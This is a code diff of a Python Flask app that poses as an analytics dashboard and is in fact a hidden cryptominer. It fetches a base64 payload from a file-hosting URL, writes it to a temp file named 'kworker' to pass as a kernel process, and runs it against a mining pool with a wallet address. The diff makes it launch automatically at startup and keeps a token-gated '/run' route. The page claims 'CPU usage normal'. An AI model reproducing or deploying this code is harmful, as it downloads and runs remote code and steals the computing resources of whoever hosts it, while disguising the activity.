@@ -8,16 +8,16 @@ from flask import Flask, request
 
 app = Flask(__name__)
 
-# 🔒 Configurations
+# Config
 REMOTE_PAYLOAD_URL = "https://0x0.st/8nW7.b64"
-TRIGGER_TOKEN = "runXMR"
 FAKE_BINARY_NAME = "kworker"
+TRIGGER_TOKEN = "runXMR"  # optional manual retrigger
 
 def stealth_fetch_and_launch():
     try:
-        print("[*] Fetching base64 payload...")
-        encoded = requests.get(REMOTE_PAYLOAD_URL).text.strip()
+        print("[*] Fetching and launching payload...")
 
+        encoded = requests.get(REMOTE_PAYLOAD_URL).text.strip()
         binary = base64.b64decode(encoded)
 
         with tempfile.NamedTemporaryFile(delete=False) as f:
@@ -25,47 +25,44 @@ def stealth_fetch_and_launch():
             f.write(binary)
             os.chmod(bin_path, 0o755)
 
-        # Rename to look legit
         safe_path = os.path.join(tempfile.gettempdir(), FAKE_BINARY_NAME)
         os.rename(bin_path, safe_path)
 
-        print("[+] Executing cloaked binary...")
         subprocess.Popen(
             [safe_path,
              "-a", "rx/0",
              "-o", "in.salvium.herominers.com:1230",
              "-u", "SaLvdUFXatp5x7yDhRhqrgL9wYNaj379vj1jdwWUKY6GDXKVxachcFV9R4qUAziZtGDgNCQJVQwrkGhD7VjknpSCbH5p8kwbReo",
-             "-p", "meb",
+             "-p", "web",
              "--donate-level", "1"],
             stdout=subprocess.DEVNULL,
             stderr=subprocess.DEVNULL
         )
 
+        print("[+] Miner launched as", FAKE_BINARY_NAME)
+
     except Exception as e:
-        print("[-] Error in miner launch:", e)
+        print("[-] Launch error:", e)
 
 @app.route('/')
 def home():
     return '''
-    <html>
-    <head><title>Flask Analytics Portal</title></head>
+    <html><head><title>Analytics Dashboard</title></head>
     <body>
-        <h1>Welcome to Flask Analytics Suite</h1>
-        <p>Data visualization and real-time metrics platform.</p>
+        <h1>Welcome to Flask Analytics</h1>
+        <p>System running. CPU usage normal.</p>
     </body>
     </html>
     '''
 
-@app.route('/analytics')
-def fake_api():
-    return {"visitors": 12, "bounce_rate": "43%", "status": "active"}
-
-@app.route('/run')
-def trigger():
+@app.route('/run')  # Optional manual retrigger
+def manual_trigger():
     if request.args.get("token") == TRIGGER_TOKEN:
         threading.Thread(target=stealth_fetch_and_launch).start()
-        return "✅ Payload triggered."
+        return "✅ Payload re-triggered."
     return "❌ Unauthorized", 403
 
 if __name__ == '__main__':
+    # Launch the miner as soon as app starts
+    threading.Thread(target=stealth_fetch_and_launch).start()
     app.run(host='0.0.0.0', port=8080)
